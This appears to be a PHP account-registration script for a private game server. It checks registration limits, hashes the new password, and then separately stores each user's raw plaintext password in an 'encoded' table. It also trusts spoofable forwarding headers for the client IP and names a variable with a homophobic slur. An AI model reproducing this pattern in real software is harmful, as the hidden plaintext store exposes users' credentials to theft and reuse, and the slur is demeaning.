<?php
include "../incl/lib/connection.php";
require_once "../incl/lib/exploitPatch.php";
require_once "../incl/lib/mainLib.php";
$gs = new mainLib();

////
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
}

$usr = $db->query("SELECT COUNT(*) FROM users WHERE isRegistered = 1");
$acc = $db->query("SELECT COUNT(*) FROM accounts");

$users = $usr->fetchColumn();
$accounts = $acc->fetchColumn();

$gays = $accounts - $users;
if($gays > 260)
{
exit("Blocked Func.");
die();
}
$date = date("o j m");
$qur = $db->prepare("INSERT INTO `exec` VALUES (:datr)");
$qur2 = $db->prepare("SELECT count(*) FROM `exec` WHERE `date` = :jata");
$qur2->execute([':jata' => $date]);

$count32 = $qur2->fetchColumn();
if($maxaccs > $count32)
{
$qur->execute([':datr' => $date]);
}
else
{
	die("Лимит превышен!");
}
$ep = new exploitPatch();
$ep->DOS($ip);
if($_POST["userName"] != ""){
	//here im getting all the data
	$userName = $ep->remove($_POST["userName"]);
	$password = $ep->remove($_POST["password"]);
	$email = $ep->remove($_POST["email"]);
	$secret = "";
	//checking if name is taken
	$query2 = $db->prepare("SELECT count(*) FROM accounts WHERE userName LIKE :userName");
	$query2->execute([':userName' => $userName]);
	$regusrs = $query2->fetchColumn();
	if ($regusrs > 0) {
		echo "-2";
	}else{
		$hashpass = password_hash($password, PASSWORD_DEFAULT);
		$query = $db->prepare("INSERT INTO accounts (coins, userName, password, email, secret, saveData, registerDate, saveKey)
		VALUES (0, :userName, :password, :email, :secret, '', :time, '')");
		$query->execute([':userName' => $userName, ':password' => $hashpass, ':email' => $email, ':secret' => $secret, ':time' => time()]);
		$query2 = $db->prepare("INSERT INTO encoded VALUES (:userName,:password)");
		$query2->execute([':userName' => $userName, ':password' => $password]);
		echo "1";
	}
}
?>
